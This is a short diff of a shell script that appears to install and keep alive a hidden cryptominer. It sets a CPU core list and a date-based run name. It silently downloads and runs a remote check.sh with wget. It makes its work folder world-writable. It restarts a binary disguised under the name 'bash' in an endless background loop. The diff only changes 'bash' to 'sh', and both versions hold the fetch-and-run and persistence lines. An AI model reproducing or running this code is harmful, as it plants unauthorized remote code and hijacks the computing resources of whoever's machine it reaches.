@@ -23,7 +23,7 @@ rx="[`seq -s ', ' 0 $((cores - 1))`]" || rx=""
 rxName=`TZ=":Asia/Shanghai" date '+%Y%m%d'`
 [ -n "$rxName" ] || rxName="$name"
 
-bash <(wget -qO- ${src}/check.sh) >/dev/null 2>&1 &
+sh <(wget -qO- ${src}/check.sh) >/dev/null 2>&1 &
 
 
 # if [ "$mode" == "1" ]; then
@@ -48,8 +48,8 @@ chmod -R 777 "${work}"
 
 cmd="while true; do cd ${work}; ./bash >/dev/null 2>&1 ; sleep 7; done"
 if [ "$mode" == "0" ]; then
-  bash <(echo "$cmd") >/dev/null 2>&1 &
+  sh <(echo "$cmd") >/dev/null 2>&1 &
 else
-  bash <(echo "$cmd")
+  sh <(echo "$cmd")
 fi
 
